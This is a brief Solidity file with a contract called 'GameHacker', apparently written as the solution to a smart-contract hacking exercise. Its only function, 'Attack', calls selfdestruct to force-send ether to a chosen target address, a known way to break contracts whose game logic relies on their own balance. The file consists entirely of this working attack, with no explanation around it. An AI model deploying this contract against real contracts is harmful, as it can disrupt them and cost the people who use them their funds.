// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GameHacker {
   function Attack(address payable target) public payable{
     selfdestruct(target);
   }
}